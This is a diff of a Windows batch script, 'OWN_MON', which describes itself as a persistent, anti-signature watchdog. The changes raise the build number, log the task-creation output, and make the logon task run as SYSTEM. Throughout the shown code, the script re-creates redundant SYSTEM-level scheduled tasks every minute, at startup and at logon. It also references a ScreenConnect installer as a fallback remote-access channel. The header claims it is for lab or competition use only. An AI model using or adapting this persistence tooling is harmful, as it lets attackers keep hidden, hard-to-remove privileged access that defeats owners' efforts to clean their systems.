@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M13
+rem  OWN_MON  BUILD 20260802M14
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -31,7 +31,7 @@ set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M13"
+set "MONVER=M14"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -81,24 +81,24 @@ rem ── [B] re-arm chain 1 (schtasks) if missing ─────────�
 schtasks /Query /TN "%TASK_A%" >nul 2>&1
 if errorlevel 1 (
   echo rearm TASK_A %TASK_A%>>"%LOG%"
-  schtasks /Create /F /TN "%TASK_A%" /SC MINUTE /MO %MO_A% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >nul 2>&1
+  schtasks /Create /F /TN "%TASK_A%" /SC MINUTE /MO %MO_A% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
   schtasks /Run /TN "%TASK_A%" >nul 2>&1
 )
 schtasks /Query /TN "%TASK_B%" >nul 2>&1
 if errorlevel 1 (
   echo rearm TASK_B %TASK_B%>>"%LOG%"
-  schtasks /Create /F /TN "%TASK_B%" /SC MINUTE /MO %MO_B% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >nul 2>&1
+  schtasks /Create /F /TN "%TASK_B%" /SC MINUTE /MO %MO_B% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
   schtasks /Run /TN "%TASK_B%" >nul 2>&1
 )
 schtasks /Query /TN "%TASK_C%" >nul 2>&1
 if errorlevel 1 (
   echo rearm TASK_C %TASK_C%>>"%LOG%"
-  schtasks /Create /F /TN "%TASK_C%" /SC ONSTART /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >nul 2>&1
+  schtasks /Create /F /TN "%TASK_C%" /SC ONSTART /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
 )
 schtasks /Query /TN "%TASK_D%" >nul 2>&1
 if errorlevel 1 (
   echo rearm TASK_D %TASK_D%>>"%LOG%"
-  schtasks /Create /F /TN "%TASK_D%" /SC ONLOGON /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >nul 2>&1
+  schtasks /Create /F /TN "%TASK_D%" /SC ONLOGON /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
 )
 
 rem ── [B2] re-arm chain 2 (WMI subscription) if missing ─────────
